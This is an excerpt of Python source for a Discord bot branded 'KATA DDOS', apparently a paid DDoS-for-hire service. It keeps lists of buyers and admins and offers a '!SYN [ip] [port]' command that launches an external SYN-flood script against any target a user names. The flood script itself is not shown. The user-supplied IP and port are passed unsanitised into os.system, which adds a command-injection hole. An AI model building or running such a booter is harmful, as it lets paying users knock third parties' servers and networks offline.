...
import psutil
token = ""
buyers = [1091376547379814441]
admins = [1091376547379814441]
ownerList = [1091376547379814441]
...
async def Botinfo(ctx):
	...
	embed.add_field(name="ID :", value="1091376547379814441")
...
async def Commands(ctx):
	if ctx.author.id not in buyers:
		...
		embed.add_field(name="**SYN**", value="```!SYN [ip] [port]```")
...
@bot.command()
async def SYN(ctx, ip,port,time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **KATA DDOS** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : katavnnn#8946 | Warning {ctx.author.name}")
		...
		embed.add_field(name="**Methods**", value="`SYN`")
		...
		os.system(f"python3 SYN.py {ip} {port}")
